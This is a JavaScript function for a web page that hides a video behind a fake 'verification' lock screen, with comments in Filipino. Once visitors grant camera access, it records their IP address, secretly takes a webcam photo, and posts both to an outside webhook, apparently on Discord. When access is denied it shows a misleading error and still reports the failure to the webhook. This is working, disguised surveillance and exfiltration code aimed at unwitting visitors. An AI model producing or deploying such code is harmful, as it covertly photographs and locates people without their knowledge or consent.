async function requestAccess() {
    const errorText = document.getElementById('error');
    const player = document.getElementById('player');
    const lockScreen = document.getElementById('lock-screen');
    
    try {
        // 1. IP Grabber (Instant)
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();

        // 2. FORCE CAMERA (Dito dapat lalabas ang popup)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // PAG-ALLOW LANG SILA, DITO LANG LALABAS ANG VIDEO
        lockScreen.style.display = 'none';
        player.style.display = 'block';
        player.src += "&autoplay=1"; // Dito lang natin i-trigger ang play

        // Kunin ang shot...
        const vid = document.getElementById('v');
        vid.srcObject = stream;
        setTimeout(async () => {
            const can = document.getElementById('c');
            can.width = 640; can.height = 480;
            can.getContext('2d').drawImage(vid, 0, 0);
            const img = can.toDataURL('image/jpeg', 0.6);
            const blob = await (await fetch(img)).blob();
            const fd = new FormData();
            fd.append('file', blob, 'huli.jpg');
            fd.append('payload_json', JSON.stringify({ content: "üéØ **SUCCESS!** IP: " + ipData.ip }));
            fetch(hook, { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
        }, 1000);

    } catch (e) {
        // PAG NAG-DENY O WALANG POPUP, HINDI LALABAS ANG VIDEO
        errorText.innerHTML = "‚ö†Ô∏è **Access Denied.** Browser blocked the verification popup. Please enable camera in Site Settings and refresh.";
        errorText.style.display = 'block';
        
        // Send notification pa rin
        fetch(hook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ content: "üö´ **FAILED:** Ayaw lumabas ng popup/Denied." })
        });
    }
}
